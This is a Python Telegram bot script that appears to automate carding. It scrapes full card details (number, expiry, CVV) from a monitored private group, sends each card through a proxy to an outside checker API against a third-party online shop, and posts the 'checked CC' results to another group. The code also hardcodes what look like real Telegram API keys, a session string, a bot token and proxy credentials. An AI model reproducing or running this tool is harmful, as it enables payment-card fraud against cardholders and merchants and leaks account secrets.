import re
import aiohttp
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Bot
from telegram.helpers import escape_markdown
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ---------------- CONFIG ----------------
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102e76a"
SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"

PRIVATE_GROUP_ID = -1002682944548  # group to monitor
TARGET_GROUP_ID = -1002968335063   # official group to post
ADMIN_ID = 8493360284  # Replace with your Telegram user ID

API_URL = "https://autosh.arpitchk.shop/puto.php"
SITE = "https://jasonwubeauty.com"
PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"

CARD_REGEX = re.compile(r"(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})")

# ---------------- INIT CLIENTS ----------------
user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
bot_client = Bot(token=BOT_TOKEN)

# ---------------- STATE ----------------
dropping_enabled = False

# ---------------- FUNCTIONS ----------------
async def process_card(card: str):
    """
    Sends the card to API and posts the response in official group
    """
    params = {"site": SITE, "cc": card, "proxy": PROXY}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(API_URL, params=params) as resp:
                data = await resp.json()
        except Exception as e:
            data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}

    # Escape markdown to avoid parsing errors
    cc = escape_markdown(str(data.get('cc')), version=2)
    price = escape_markdown(str(data.get('Price')), version=2)
    response = escape_markdown(str(data.get('Response')), version=2)
    msg = f"CC: `{cc}`\nPrice: {price}\nResponse: {response}"

    try:
        await bot_client.send_message(chat_id=TARGET_GROUP_ID, text=msg, parse_mode="MarkdownV2")
    except Exception as e:
        print(f"❌ Failed to send message: {e}")

# ---------------- CARD LISTENER ----------------
@user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def card_listener(event):
    global dropping_enabled
    text = event.message.message
    if not text:
        return

    matches = CARD_REGEX.findall(text)
    if not matches or not dropping_enabled:
        return

    tasks = [asyncio.create_task(process_card("|".join(m))) for m in matches]
    await asyncio.gather(*tasks)

# ---------------- BOT COMMANDS ----------------
async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if user_id == ADMIN_ID:
        await context.bot.send_message(chat_id=chat_id, text="✅ Send me /drop to start dropping checked CC")
    else:
        await context.bot.send_message(chat_id=chat_id,
                                       text="The OFFICIAL dropper of Card X CHK\nAccess Denied — bot only for official group")

async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id == ADMIN_ID:
        dropping_enabled = True
        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Dropping enabled!")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Access Denied!")

async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id == ADMIN_ID:
        dropping_enabled = False
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⏹ Dropping stopped.")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Access Denied!")

# ---------------- MAIN ----------------
async def main():
    await user_client.start()
    print("✅ Hybrid bot is running...")

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("drop", drop))
    app.add_handler(CommandHandler("stop", stop))

    # Run the telegram bot in background
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    # Keep Telethon client running on same loop
    await user_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
